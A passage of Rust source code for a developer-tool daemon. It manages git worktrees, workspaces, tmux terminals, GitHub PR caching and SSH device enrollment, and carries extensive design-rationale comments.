}

#[derive(Debug)]
pub struct TerminalView {
    pub terminal: models::Terminal,
    pub derived: DerivedTerminal,
}

impl TerminalView {
    pub fn state(&self) -> TerminalState {
        self.derived.state
    }
}

impl Service {
    /// Open the service at the user's runtime directory.
    pub async fn open() -> Result<Self> {
        Self::open_in(paths::ensure_runtime_dir()?).await
    }

    /// Open the service at an explicit directory.
    ///
    /// The environment is read once, at the edge, so nothing below this point
    /// depends on a process-global that another thread can change.
    pub async fn open_in(root: PathBuf) -> Result<Self> {
        let install_id = paths::load_or_create_install_id_in(&root)?;
        let store = Arc::new(Store::open(root.join("farcooler.db"))?);

        // The daemon identity is stable per install, so tags written by a prior
        // run of this same daemon remain provable after a restart.
        let host_id = stable_host_id(&install_id);
        let tmux = TmuxServer::new(&install_id, host_id);
        let inventory = LiveInventory::new(tmux.clone());
        inventory.refresh().await;

        let registry = std::sync::RwLock::new(Arc::new(farcooler_core::config::load_registry()));

        Ok(Self {
            store: store.clone(),
            tmux,
            inventory: inventory.clone(),
            host_id,
            install_id,
            root,
            authorized_keys: default_authorized_keys(),
            sessions: crate::sessions::Sessions::new(),
            registry,
            agents: agent_supervisor::AgentSupervisor::with_records(store.clone()),
            hooks: hook_ingress::HookIngress::new(store.clone(), Arc::new(inventory.clone())),
            review_cache: crate::review::ReviewCache::new(),
            pr_cache: std::sync::Mutex::new(std::collections::HashMap::new()),
            pr_fills: std::sync::Mutex::new(std::collections::HashMap::new()),
            gh_limit: Arc::new(tokio::sync::Semaphore::new(crate::stack::GH_MAX_CONCURRENT)),
            default_branches: std::sync::Mutex::new(std::collections::HashMap::new()),
            repo_urls: std::sync::Mutex::new(std::collections::HashMap::new()),
            repo_locks: std::sync::Mutex::new(std::collections::HashMap::new()),
        })
    }

    /// Enroll devices into some other file than this user's own.
    ///
    /// Exists for the tests, and says so: they run in parallel in one process
    /// against a file whose corruption costs somebody SSH access, so each needs
    /// its own. Taken by value and returned, so it can only be set before the
    /// service is shared — a path that could change under a write in flight
    /// would be a write that lands in two files.
    pub fn enrolling_into(mut self, path: PathBuf) -> Self {
        self.authorized_keys = path;
        self
    }

    /// The file this runner's device keys live in.
    pub fn authorized_keys(&self) -> &Path {
        &self.authorized_keys
    }

    /// This runner's persistent tailcat identity, mode 0600, under
    /// `FARCOOLER_HOME`.
    ///
    /// Its existence IS the feature flag. No file, no server, no DERP
    /// connection, and "binds no port" is the whole of rule 1 for that runner.
    ///
    /// A ceremony creates it. `enrollment::enroll` calls
    /// `farcooler_tailcat::ensure_identity` when a pairing carries a node key,
    /// because being handed a device's node key is what "somebody asked this
    /// runner to be reachable through a tunnel" looks like. It happens BEFORE
    /// `allowlist::start_tunnel`, so `tunnel_plan`'s `NoIdentity` guard is
    /// passed by a runner that genuinely has one rather than bypassed — see
    /// `enrollment::tunnel_route`.
    ///
    /// A pairing carrying NO node key creates nothing, and nothing else in the
    /// product does either: a runner nobody asked to join does not join.
    /// `scripts/tunnel-smoke.sh` writes one too, for a check that needs a
    /// runner without a ceremony. Deleting the file undoes all of it.
    pub fn tailcat_key(&self) -> PathBuf {
        self.root.join("tailcat.key")
    }

    /// Where this runner's own sshd actually listens, on loopback.
    ///
    /// Always 22 today. That is real, not a placeholder pretending to be
    /// configurable: nothing in this daemon reads `sshd_config`, and no
    /// manifest field carries a different answer yet — a deliberate omission,
    /// not an oversight, per "The port number is virtual" in
    /// `docs/superpowers/specs/2026-08-31-tailcat-transport-design.md`. A
    /// client's own dial always asks for port 22 too, as a name rather than a
    /// claim about where sshd listens, so a Direct destination and a Tailcat
    /// one agree on the wire until this method starts telling the truth for
    /// runners it does not yet.
    ///
    /// A runner whose sshd is genuinely not on 22 already exists in this
    /// product's own model — `Destination::Direct` reads a configurable
    /// `port` off a config (`crates/client/src/ffi.rs`, `"port"`, default
    /// 22) — and this method has no way to learn that value yet for a
    /// tunneled one. For such a runner, Go dials loopback `:22`, finds
    /// nothing listening, and the client renders `ECONNREFUSED` as
    /// `SshError::TunnelPortClosed` (`crates/client/src/ssh.rs:287-303`).
    /// That fails closed and is not silently wrong, but it names a plausible
    /// cause — a closed tunnel — that is not the true one. Fixing it needs
    /// this method to actually vary, which is the same later work the doc
    /// above already defers.
    pub fn ssh_port(&self) -> u16 {
        22
    }

    /// The connections this daemon is serving right now.
    pub fn sessions(&self) -> &Arc<crate::sessions::Sessions> {
        &self.sessions
    }

    /// Wait for permission to run `gh`. Held for the length of the call.
    pub async fn gh_permit(&self) -> tokio::sync::OwnedSemaphorePermit {
        self.gh_limit
            .clone()
            .acquire_owned()
            .await
            .expect("the gh semaphore is never closed")
    }

    /// A repository's default branch: GitHub's answer when `gh` can give one,
    /// `origin/HEAD` when it cannot, and remote-qualified either way.
    ///
    /// Asked at most once per repository per daemon lifetime, including the
    /// misses — a runner without `gh` must not pay for a process launch every
    /// time somebody scrolls a diff.
    ///
    /// It also records the repository's web URL, which the same `gh repo view`
    /// answers in the same response — see `repo_web_url`. One extra JSON field
    /// on a subprocess that already runs, rather than a hand-written parser for
    /// `git@github.com:o/r.git` that would be wrong for every GitHub Enterprise
    /// host. That is why this is the only writer of either map.
    ///
    /// The qualification is the LAST step here, over whichever answer arrived,
    /// because `gh` returns a bare `main` and `origin/HEAD` returns
    /// `origin/main`: two roads that were free to disagree, and did. See
    /// `change_set::remote_qualified` (`change_set.rs:676`) for what the
    /// disagreement cost. It is one local `rev-parse`, behind the same cache as
    /// the rest of this, so it costs nothing per diff.
    pub async fn default_branch(&self, repository_id: Uuid, worktree: &Path) -> Option<String> {
        if let Some(cached) =
            self.default_branches.lock().unwrap_or_else(|e| e.into_inner()).get(&repository_id)
        {
            return cached.clone();
        }

        let facts = {
            let _permit = self.gh_permit().await;
            crate::stack::fetch_repo_facts(worktree).await
        };
        // `origin/HEAD` records the same fact without a network, and is right
        // whenever the clone has ever been told.
        let found = match facts.default_branch {
            Some(name) => Some(name),
            None => crate::change_set::default_branch_local(worktree).await,
        };
        let found = match found {
            Some(name) => Some(crate::change_set::remote_qualified(worktree, &name).await),
            None => None,
        };

        // The URL first, so the early return above can never hand a caller a
        // cached default branch for a repository whose URL has not been
        // recorded yet — the two are written by this function alone, and a
        // reader that saw one without the other would report an empty compare
        // link for a repository the daemon does know the URL of.
        self.repo_urls
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .insert(repository_id, facts.url);
        self.default_branches
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .insert(repository_id, found.clone());
        found
    }

    /// A repository's page on GitHub, if `gh` has ever answered for it.
    ///
    /// Cache-only, and deliberately so: this is read on the `stack.get` path,
    /// where nothing may wait on a subprocess. `None` before the first
    /// `default_branch` call for this repository has landed — which the
    /// background fill in `review_ops::fill_prs_in_background` makes, so the
    /// answer follows on the `stack_changed` event a moment later.
    pub fn repo_web_url(&self, repository_id: Uuid) -> Option<String> {
        self.repo_urls
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .get(&repository_id)
            .cloned()
            .flatten()
    }

    /// PR state as last read, or `None` when it has never been read since this
    /// process started. `None` means Unknown to a client, never "not merged".
    pub fn pr_cache_get(&self, repository_id: Uuid) -> Option<Vec<crate::stack::PrInfo>> {
        self.pr_cache
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .get(&repository_id)
            .cloned()
            .flatten()
    }

    pub fn pr_cache_put(&self, repository_id: Uuid, prs: Option<Vec<crate::stack::PrInfo>>) {
        self.pr_cache.lock().unwrap_or_else(|e| e.into_inner()).insert(repository_id, prs);
    }

    /// Whether `gh` has ever ANSWERED about this repository since this process
    /// started.
    ///
    /// The distinction `pr_cache_get` erases by flattening, and the one the
    /// whole of `pr_known` rests on: an entry holding `None` is a `gh` that ran
    /// and failed, and no entry at all is a `gh` that was never run. Both come
    /// back from `pr_cache_get` as `None`, and both reach a client as an absent
    /// `pr` on every link — so without this, an app cannot tell "there is no
    /// pull request" from "we could not ask", and offering to create one is a
    /// coin flip.
    pub fn pr_answer_is_known(&self, repository_id: Uuid) -> bool {
        matches!(
            self.pr_cache.lock().unwrap_or_else(|e| e.into_inner()).get(&repository_id),
            Some(Some(_))
        )
    }

    /// Whether this caller should fill the PR cache for `repository_id` now.
    ///
    /// True at most once per `GH_MIN_INTERVAL` per repository, and never at all
    /// while the cache already holds an answer from `gh`. A read FILLS an empty
    /// cache; it does not poll a full one — the daemon-wide timer this could
    /// have been is deliberately not built, and what makes that affordable is
    /// that no client looking at a repository means no `stack.get`, means no
    /// fetch.
    ///
    /// A repository `gh` failed for is retried, subject to the same interval,
    /// rather than poisoned until somebody calls `pr.refresh`. That call is
    /// `Scope::Control` and the client this exists for is a read-scoped phone
    /// (`rpc.rs`'s scope table): if one timeout meant an empty row forever, the
    /// phone would be back where decision 2 found it.
    ///
    /// The cache is inspected while the attempt map is held, not before it. Two
    /// connections arriving together would otherwise both see an empty cache,
    /// both take the lock in turn, and both record an attempt — which is the
    /// stampede this is here to prevent.
    pub fn claim_pr_fill(&self, repository_id: Uuid) -> bool {
        let mut attempts = self.pr_fills.lock().unwrap_or_else(|e| e.into_inner());
        if self.pr_answer_is_known(repository_id) {
            return false;
        }
        if let Some(started) = attempts.get(&repository_id) {
            if started.elapsed() < crate::stack::GH_MIN_INTERVAL {
                return false;
            }
        }
        attempts.insert(repository_id, std::time::Instant::now());
        true
    }

    /// The supervisor for every terminal's agent session.
    pub fn agents(&self) -> &agent_supervisor::AgentSupervisor {
        &self.agents
    }

    /// Where this service's runtime data lives. Attachment blobs sit under it,
    /// beside the database rather than inside it, and pasted files land there too.
    pub fn root_dir(&self) -> &std::path::Path {
        &self.root
    }

    /// Which install this is. See the field.
    pub fn install_id(&self) -> &str {
        &self.install_id
    }

    /// The lock guarding one repository's git-plus-metadata sequences.
    pub fn repo_lock(&self, repository_id: Uuid) -> Arc<tokio::sync::Mutex<()>> {
        // A std mutex, not a tokio one: this holds only long enough to clone an
        // Arc out of a map, and awaiting to look up a lock would be a lock to
        // reach a lock.
        let mut locks = self.repo_locks.lock().unwrap_or_else(|e| e.into_inner());
        Arc::clone(locks.entry(repository_id).or_default())
    }

    /// Which agents are recognized, and which can be hosted as a chat.
    ///
    /// An `Arc` snapshot rather than a borrow, so an operation reads one
    /// consistent registry from start to finish even if a settings write
    /// replaces it midway.
    pub fn registry(&self) -> Arc<farcooler_core::activity::Registry> {
        Arc::clone(&self.registry.read().unwrap_or_else(|e| e.into_inner()))
    }

    /// Re-read `config.toml`'s adapters and swap them in.
    ///
    /// Called only after a write through `adapter.upsert` or `adapter.delete`,
    /// which is the whole difference between this and reading per call: an
    /// explicit edit takes effect, and nothing else can move the rules out from
    /// under an operation in flight.
    pub fn reload_registry(&self) {
        let fresh = Arc::new(farcooler_core::config::load_registry());
        *self.registry.write().unwrap_or_else(|e| e.into_inner()) = fresh;
    }


    /// Where managed worktrees are created, one directory per workspace.
    fn worktrees_dir(&self) -> Result<PathBuf> {
        let dir = self.root.join("worktrees");
        std::fs::create_dir_all(&dir).map_err(|_| DomainError::OperationFailed)?;
        Ok(dir)
    }

    /// Where a worktree of this name goes, once it is known nothing is there.
    ///
    /// One directory per repository, so the leaf is the worktree's name and
    /// nothing else. Worktrees used to share one flat directory and carry their
    /// repository as a prefix — `overnight-rate-limiting` — purely to keep two
    /// projects' worktrees apart. A subdirectory does that structurally, and
    /// leaves a name that reads as prose without anything being stripped back
    /// off it. Worktrees created before this keep their flat paths and their
    /// prefix; nothing moves them, because moving a directory out from under
    /// someone to tidy up a label is worse than a wordy sidebar row.
    ///
    /// The existence check is here rather than left to git so the answer is
    /// "a worktree of that name is already here" and not whatever git says
    /// about a directory it declined to create.
    fn worktree_dest(&self, repo: &models::Repository, name: &str) -> Result<PathBuf> {
        let dir = self.worktrees_dir()?.join(names::slug(&repo.display_name));
        std::fs::create_dir_all(&dir).map_err(|_| DomainError::OperationFailed)?;
        let dest = dir.join(names::slug(name));
        if dest.exists() {
            return Err(DomainError::WorktreeExists);
        }
        Ok(dest)
    }

    // ---- repository roots ----

    /// Add an allowlisted repository root.
    ///
    /// Canonicalizes, rejects a path that is not an existing directory, rejects
    /// nesting inside or containing an existing root, and rejects sensitive
    /// locations. Adding a root does not scan or register anything inside it.
    pub async fn add_root(&self, path: &Path) -> Result<models::RepositoryRoot> {
        let canonical = path.canonicalize().map_err(|_| DomainError::InvalidArgument {
            what: "path does not exist",
        })?;
        if !canonical.is_dir() {
            return Err(DomainError::InvalidArgument { what: "not a directory" });
        }
        reject_sensitive_root(&canonical)?;

        for existing in self.store.list_repository_roots()? {
            let e = PathBuf::from(&existing.path);
            if canonical.starts_with(&e) || e.starts_with(&canonical) {
                return Err(DomainError::PathNotAllowed);
            }
        }

        self.store.create_repository_root(
            self.host_id,
            &canonical.to_string_lossy(),
            now_millis(),
        )
    }

    pub fn list_roots(&self) -> Result<Vec<models::RepositoryRoot>> {
        self.store.list_repository_roots()
    }

    /// Every repository path must sit inside an allowlisted root.
    fn root_for(&self, path: &Path) -> Result<models::RepositoryRoot> {
        self.store
            .list_repository_roots()?
            .into_iter()
            .find(|r| path.starts_with(&r.path))
            .ok_or(DomainError::PathNotAllowed)
    }

    // ---- repositories ----

    pub async fn register_repository(&self, path: &Path) -> Result<models::Repository> {
        let canonical = path
            .canonicalize()
            .map_err(|_| DomainError::InvalidArgument { what: "path does not exist" })?;
        let root = self.root_for(&canonical)?;

        let git_dir = git::validate_repository(&canonical).await?;
        let display_name = canonical
            .file_name()
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_else(|| "repository".to_string());
        validate::display_name(&display_name)?;

        let remote = git::remote_summary(&canonical).await;

        let repository = self.store.create_repository(
            self.host_id,
            root.id,
            &display_name,
            &git_dir.to_string_lossy(),
            &remote,
        )?;

        // Unlike the reconcile call below, this is NOT best-effort: the
        // prefix is derived from the name as registered, here. `?`
        // propagates a failure as the registration's own failure rather than
        // returning a repository without one. (Should that row outlive the
        // failure, `Store::next_task_key` claims a prefix before its first
        // key, so it still never mints "-1".)
        let prefix = self.store.assign_task_key_prefix(repository.id)?;
        tracing::info!(repository = %repository.id, %prefix, "assigned a task key prefix");
        // Re-read rather than patching the struct in hand: `assign_task_key_prefix`
        // also bumped `resource_version`, and this is the one copy of that
        // number that is actually current.
        let repository = self.store.get_repository(repository.id)?;

        // Synchronously, before returning: adding a project should fill the
        // sidebar by the time the sheet closes, not a tick later. A failure
        // here is logged rather than propagated — the repository IS registered,
        // and the next tick reconciles it anyway.
        if let Err(e) = crate::reconcile::repository(self, repository.id).await {
            tracing::warn!(error = ?e, "could not reconcile a freshly registered repository");
        }

        Ok(repository)
    }

    pub fn list_repositories(&self) -> Result<Vec<models::Repository>> {
        let mut all = Vec::new();
        for root in self.store.list_repository_roots()? {
            all.extend(self.store.list_repositories_for_root(root.id)?);
        }
        Ok(all)
    }

    /// The working tree for a registered repository.
    ///
    /// `canonical_git_dir` is the `.git` directory, so the working tree is its
    /// parent for an ordinary non-bare repository.
    pub fn repository_worktree(&self, repo: &models::Repository) -> PathBuf {
        let git_dir = PathBuf::from(&repo.canonical_git_dir);
        git_dir.parent().map(|p| p.to_path_buf()).unwrap_or(git_dir)
    }

    // ---- workspaces ----

    /// Create a workspace: one worktree plus branch for one task.
    ///
    /// Git succeeds before any metadata is written. If metadata then fails, the
    /// newly created clean worktree and unpushed branch are rolled back, and a
    /// dirty one is preserved instead.
    pub async fn create_workspace(
        &self,
        repository_id: Uuid,
        name: &str,
        branch: &str,
        base_revision: &str,
    ) -> Result<models::Workspace> {
        validate::worktree_name(name)?;
        validate::branch_name(branch)?;

        // Held until this function returns: everything below is "mutate git,
        // then write the row", and the reconciler must not see the gap.
        let lock = self.repo_lock(repository_id);
        let _guard = lock.lock().await;

        let repo = self.store.get_repository(repository_id)?;
        let repo_path = self.repository_worktree(&repo);
        let dest = self.worktree_dest(&repo, name)?;

        // The commit comes back from the creation rather than being resolved
        // ahead of it, because the two can differ: a branch that already exists
        // on exactly one remote is checked out from there instead of forked
        // from the base. Rolling back compares this against the worktree's
        // HEAD, so a second `resolve_revision` here would refuse to remove the
        // very worktree it had just made.
        let created = git::create_worktree(&repo_path, branch, base_revision, &dest).await?;
        let base_commit = created.commit;
        // Claim it before anyone can adopt it. Another install sharing this
        // host sees the same worktree in `git worktree list` and would
        // otherwise take it for its own fleet.
        git::mark_owner(&dest, &self.install_id).await;
        // And say whether it is a NEW branch, which is what cursor's
        // `--trust` is drawn on (`forked_this_worktree`). A branch checked
        // out from a remote carries somebody's commits, and is not marked.
        if created.forked {
            git::mark_forked(&dest, &self.install_id).await;
        }

        match self.store.create_workspace(repository_id, branch, &dest.to_string_lossy(), false) {
            Ok(ws) => {
                // After the row, not before it: the failure arm below removes
                // the worktree again, and there is no reason to have written
                // into a directory that is about to go.
                install_project_hooks(&dest, &hook_ingress::HookIngress::socket_path(&self.root)).await;
                Ok(ws)
            }
            Err(e) => {
                // Do not erase a possibly valuable worktree to make the database
                // look clean. Roll back only what is provably safe.
                let removed = git::rollback_worktree(&repo_path, branch, &dest, &base_commit)
                    .await
                    .unwrap_or(false);
                tracing::warn!(rolled_back = removed, "workspace metadata failed after git");
                Err(e)
            }
        }
    }

    /// Branches in a repository that work could be resumed on.
    pub async fn list_branches(&self, repository_id: Uuid) -> Result<Vec<git::BranchInfo>> {
        let repo = self.store.get_repository(repository_id)?;
        git::list_branches(&self.repository_worktree(&repo)).await
    }

    /// Every worktree git reports for a repository.
    ///
    /// A diagnostic view for `worktree.list`, a host-admin surface — not a
    /// list of candidates for a client to act on. Task 4's reconciler adopts
    /// every worktree it sees automatically, main checkout included, so
    /// "not yet registered" stopped being a meaningful filter: everything git
    /// reports either already has a workspace row or will on the next tick.
    pub async fn discover_worktrees(&self, repository_id: Uuid) -> Result<Vec<git::WorktreeInfo>> {
        let repo = self.store.get_repository(repository_id)?;
        let repo_path = self.repository_worktree(&repo);
        git::list_worktrees(&repo_path).await
    }

    /// Create a workspace on a branch that already exists.
    ///
    /// The other half of `create_workspace`. Work arrives on a branch as often
    /// as it starts on one: pushed from another machine, handed over by someone
    /// else, or produced by an agent running somewhere else entirely. Without
    /// this, picking that work up meant doing it by hand outside Far Cooler and
    /// then having Far Cooler not know about it.
    ///
    /// Takes no name. The worktree is named after the branch's last segment,
    /// which is what anyone would have typed and what the reconciler would have
    /// called it a tick later anyway — `feat/rate-limiting` lands in a directory
    /// called `rate-limiting` and reads "rate limiting".
    pub async fn adopt_branch(
        &self,
        repository_id: Uuid,
        branch: &str,
    ) -> Result<models::Workspace> {
        validate::branch_name(branch)?;

        // A branch is `feat/rate-limiting`; the worktree is `rate-limiting`. The
        // prefix says what kind of work it is, which the sidebar row does not
        // need to repeat for every worktree in the list.
        let name = branch.rsplit('/').next().unwrap_or(branch);
        validate::worktree_name(name)?;

        // Held until this function returns: everything below is "mutate git,
        // then write the row", and the reconciler must not see the gap.
        let lock = self.repo_lock(repository_id);
        let _guard = lock.lock().await;

        let repo = self.store.get_repository(repository_id)?;
        let repo_path = self.repository_worktree(&repo);
        let dest = self.worktree_dest(&repo, name)?;

        git::create_worktree_from_branch(&repo_path, branch, &dest).await?;
        git::mark_owner(&dest, &self.install_id).await;

        match self.store.create_workspace(repository_id, branch, &dest.to_string_lossy(), false) {
            Ok(workspace) => {
                // The other door into "a worktree Far Cooler just made". A
                // branch picked up from somewhere else runs the same agents in
                // the same panes, and a pane that reports nothing is exactly
                // as broken here as it is in `create_workspace`.
                install_project_hooks(&dest, &hook_ingress::HookIngress::socket_path(&self.root)).await;
                Ok(workspace)
            }
            Err(e) => {
                // The worktree exists but nothing records it. Remove it —
                // carefully, and never the branch, which was not ours to make.
                let _ = git::git(
                    &repo_path,
                    &["worktree", "remove", &dest.to_string_lossy()],
                )
                .await;
                Err(e)
            }
        }
    }

    /// Every workspace on this runner, in the order the user put them in.
    ///
    /// One query rather than a loop over repositories. The loop was not an
    /// order: `list_repositories` has no `ORDER BY` either, so the fleet came
    /// back grouped by whatever sequence the repositories happened to arrive
    /// in, and within each group in whatever sequence SQLite's query plan
    /// yielded — which shifts as rows are updated. That is the "basically
    /// random" the sidebar showed.
    ///
    /// It still lists only workspaces whose repository is registered, which is
    /// what the loop was really enforcing.
    pub fn list_workspaces(&self) -> Result<Vec<models::Workspace>> {
        self.store.list_workspaces_in_order()
    }

    /// Put these workspaces in this order, and keep it.
    ///
    /// The client sends the list it is drawing, first on screen first, and the
    /// store permutes those cards among the ranks they already hold. Nothing
    /// derived from the work is consulted here or anywhere below: the position
    /// of a card is the user's answer and only the user's, which is what makes
    /// reaching for one without reading the list possible.
    ///
    /// Not serialized per repository the way creation is. A reorder writes only
    /// this table, in one transaction, and it never runs git — so there is no
    /// worktree operation for it to race.
    pub async fn reorder_workspaces(&self, ordered: &[Uuid]) -> Result<()> {
        self.store.reorder_workspaces(ordered)
    }

    /// Take a workspace out of the main list. Never changes git data.
    ///
    /// Deliberately unconditional. Its predecessor refused while a managed
    /// terminal was running, which fit "archive" — a lifecycle step meaning
    /// done with this — and does not fit hiding, which is a view preference.
    /// A view preference that fails with an error reads as a bug.
    ///
    /// The risk that refusal guarded is real: hide a worktree and its running
    /// agent stops being visible. It is handled where it belongs, in the
    /// sidebar, whose `Hidden (n)` header carries an attention dot when
    /// anything inside it wants the user.
    pub async fn hide_workspace(&self, id: Uuid) -> Result<models::Workspace> {
        let ws = self.store.get_workspace(id)?;
        if ws.hidden {
            return Ok(ws);
        }
        self.store.set_workspace_flags(id, ws.resource_version, true, ws.worktree_missing)
    }

    /// Delete a terminal's record.
    ///
    /// For a terminal that is already gone: its command exited and there is
    /// nothing left to show. Refused while one is still live, because removing
    /// the record of a running process would orphan it — it would keep running
    /// inside tmux with nothing left that knows it exists.
    pub async fn remove_terminal(&self, id: Uuid) -> Result<()> {
        let record = self.store.get_terminal(id)?;
        let derived = self.derive_one(&record);
        if matches!(derived.state, TerminalState::Running | TerminalState::Starting) {
            return Err(DomainError::RunningProcesses);
        }

        // Take the retained dead pane with it. `remain-on-exit` keeps one so a
        // clean exit is distinguishable from a loss; once the record is gone
        // there is nothing left for it to prove.
        //
        // Nothing else to clean up: the layout IS the panes, so killing the pane
        // removes it from the arrangement, and tmux collapses the split. The old
        // model needed a separate step here to stop a stored group pointing at a
        // terminal that no longer existed.
        let _ = self.kill_pane(id).await;
        self.delete_terminal_record(id, record.resource_version)
    }

    /// Delete a terminal's row, and drop the in-memory state held for it.
    ///
    /// One function for both delete paths, because the second half is easy to
    /// leave out of one of them and nothing would report it: an orphaned
    /// assembler still answers every question correctly, it is simply never
    /// asked one again. It holds a partly-accumulated message per open
    /// message and a marker per message the terminal ever displayed, so a
    /// daemon that kept them would grow for as long as it stayed up.
    ///
    /// The supervisor holds the larger half of the same thing and is dropped
    /// on the same line: a session row and a transcript of up to
    /// `TRANSCRIPT_LIMIT` events. Both maps fill for any terminal a hook
    /// routes to, not only for panes in agent pane mode, which is what makes
    /// this worth a second call rather than a comment.
    ///
    /// After the delete, never before. A delete that is refused — a live pane,
    /// a version conflict — leaves a conversation that is still running, and
    /// discarding its half-assembled message would make the agent's next
    /// answer render as its tail alone; discarding its transcript would
    /// renumber the next event to 0 under every cursor already pointing into
    /// it.
    fn delete_terminal_record(&self, id: Uuid, expected_version: u64) -> Result<()> {
        self.store.delete_terminal(id, expected_version)?;
        self.hooks.forget(id);
        self.agents.forget(id);
        Ok(())
    }

    /// Bring a hidden workspace back into the main list.
    ///
    /// Hiding never touched git, so this never has to reconstruct anything. If
    /// the worktree went away while it was hidden the reconciler has already
    /// said so, and the row comes back carrying that fact rather than pretending
    /// otherwise.
    pub async fn unhide_workspace(&self, id: Uuid) -> Result<models::Workspace> {
        let ws = self.store.get_workspace(id)?;
        if !ws.hidden {
            return Ok(ws);
        }
        self.store.set_workspace_flags(id, ws.resource_version, false, ws.worktree_missing)
    }

    /// Stop allowing Far Cooler to operate under a directory.
    ///
    /// Refused while any task workspace under this root is still live, because
    /// a root is the thing that makes those workspaces legal: removing it while
    /// they exist would leave records Far Cooler can no longer act on. Hidden
    /// workspaces do not block it — they are already out of the way — and
    /// nothing on disk is touched either way.
    ///
    /// Every refusal is checked before anything is deleted, and every
    /// repository's `repo_lock` is held for the whole function, acquired
    /// before the first check. `reconcile::repository` takes the identical
    /// lock and Task 5 runs it on a ticker; without holding it here, a
    /// reconcile could insert a workspace row between the checks below and the
    /// deletes, reproducing the FK violation this function exists to avoid.
    /// That lock is what closes THAT race, specifically — it says nothing
    /// about `terminal.create` or a pane going live through tmux directly,
    /// neither of which takes `repo_lock`. So the delete loop below is safe
    /// against a repository gaining a workspace out from under it, but not
    /// airtight against a terminal's state changing in the vanishingly narrow
    /// window between the running check and its own delete; `remove_terminal`
    /// would refuse that one on the spot rather than silently drop it, and the
    /// caller sees the same `RunningProcesses` it would have seen a moment
    /// earlier.
    pub async fn remove_root(&self, id: Uuid) -> Result<models::RepositoryRoot> {
        let root = self.store.get_repository_root(id)?;
        let repositories = self.store.list_repositories_for_root(id)?;

        // Held until this function returns. `repo_locks` outlives `_guards`
        // (declared first, so dropped last), which is what lets each guard
        // borrow its own lock for the whole function body.
        let repo_locks: Vec<_> = repositories.iter().map(|r| self.repo_lock(r.id)).collect();
        let mut _guards = Vec::with_capacity(repo_locks.len());
        for lock in &repo_locks {
            _guards.push(lock.lock().await);
        }

        let mut all_workspaces: Vec<models::Workspace> = Vec::new();
        for repository in &repositories {
            all_workspaces.extend(self.store.list_workspaces_for_repository(repository.id)?);
        }

        // Refused while ANY task workspace remains, hidden or not.
        //
        // The design's rule was "refused while non-hidden workspaces exist",
        // which is the right instinct but leaves a gap: a hidden workspace
        // still has a worktree directory on disk. Deleting its record with the
        // root would strand that directory somewhere Far Cooler is no longer
        // allowed to touch, so it could never be cleaned up. Removing the
        // worktree already deletes the record, so "remove the worktrees first"
        // is a reachable instruction rather than a dead end.
        //
        // The main checkout is excluded from this count. Since the reconciler
        // adopts it the moment a repository is registered, counting it here
        // would make every registered repository's root permanently
        // unremovable — there is no worktree to "remove" to clear it, because
        // `remove_worktree` refuses the main checkout on purpose. Its worktree
        // is the directory the user already owns and manages themselves;
        // de-registering the root touches no disk either way, main checkout
        // included, so there is nothing here for it to strand.
        let remaining = all_workspaces.iter().filter(|w| !w.is_main_checkout).count();
        if remaining > 0 {
            return Err(DomainError::WorkspacesExist);
        }

        // Refused outright if the tmux inventory cannot be trusted at all.
        // `derive_terminal` reports EVERY terminal as `Lost` when the inventory
        // is unhealthy (`crates/core/src/derive.rs`), which would otherwise let
        // a momentarily unreachable tmux server sail straight past the running
        // check below and delete the only record of a process that may still
        // be alive — exactly what `remove_terminal`'s own guard exists to
        // prevent.
        if !self.inventory_snapshot().inventory_healthy {
            return Err(DomainError::TmuxUnavailable);
        }

        // Refused while any terminal anywhere under this root — main checkout
        // included — is running OR starting. `Running | Starting`, matching
        // `remove_terminal` exactly rather than the narrower `Running` alone:
        // a terminal mid-launch is exactly as alive as one already confirmed.
        // `RunningProcesses` is the same vocabulary `remove_terminal` and
        // `remove_worktree` already use for "something is alive under here",
        // and a stopped-but-recorded terminal does not qualify.
        for ws in &all_workspaces {
            let view = self.workspace_view(ws).await?;
            if view
                .terminals
                .iter()
                .any(|t| matches!(t.state(), TerminalState::Running | TerminalState::Starting))
            {
                return Err(DomainError::RunningProcesses);
            }
        }

        // Deleted in foreign-key order: terminals, then workspaces, then
        // repositories, then the root. Terminals go through `remove_terminal`
        // rather than a second hand-rolled deletion path beside it, so the
        // pane `remain-on-exit` retains for an already-exited terminal is
        // killed along with the record — left to a bare `delete_terminal` it
        // would be orphaned in tmux with nothing left that knows about it.
        for ws in &all_workspaces {
            for term in self.store.list_terminals_for_workspace(ws.id)? {
                self.remove_terminal(term.id).await?;
            }
        }
        for ws in &all_workspaces {
            self.store.delete_workspace(ws.id, ws.resource_version)?;
        }
        // The repositories go with it. They exist only as members of a root,
        // and leaving them behind would strand rows pointing at nothing.
        for repository in repositories {
            self.store.delete_repository(repository.id, repository.resource_version)?;
        }
        self.store.delete_repository_root(id, root.resource_version)?;
        Ok(root)
    }

    /// Whether removing this worktree should demand its name typed out.
    ///
    /// Only when there is uncommitted or untracked work in it, counting a
    /// manager-skill file git is told to ignore that isn't an unedited copy of
    /// ours (`holds_an_unseen_skill_file`). Everything
    /// committed survives in the branch, which removal never touches, so a
    /// clean worktree is recoverable by re-adding it.
    ///
    /// Demanding the name every time is worse than demanding it sometimes:
    /// people type it without reading it, and then the one gesture meant to
    /// stop a mistake is the mistake's accomplice.
    ///
    /// A worktree whose directory is already gone is not dirty and cannot be
    /// inspected, so it needs no confirmation either — there is nothing left
    /// to lose.
    pub async fn removal_needs_confirmation(&self, id: Uuid) -> Result<bool> {
        let ws = self.store.get_workspace(id)?;
        if !std::path::Path::new(&ws.worktree_path).is_dir() {
            return Ok(false);
        }
        // A worktree we cannot inspect is treated as dirty. Guessing "clean"
        // here would skip the confirmation on exactly the repositories where
        // something is already wrong.
        let worktree = std::path::Path::new(&ws.worktree_path);
        // One `git status` for both of the next two answers. It is a full
        // `--untracked-files=all` scan, which in a worktree holding a large
        // untracked tree (a `target/`, a `node_modules/`) is the slow part of
        // this whole check.
        let Ok(mut status) = crate::change_set::working_tree_as_git_reports_it(worktree).await else {
            return Ok(true);
        };
        // What `git::is_dirty` subtracts: an untracked hooks file holding
        // anything besides our registrations.
        if holds_an_unseen_hook_file(worktree, &status, &hook_ingress::HookIngress::socket_path(&self.root)) {
            return Ok(true);
        }
        // `git::is_dirty`'s answer, from the same snapshot.
        crate::hook_install::hide_our_untracked(&mut status);
        if status.is_dirty() {
            return Ok(true);
        }
        // What git is told to ignore: an edited copy of the manager skill.
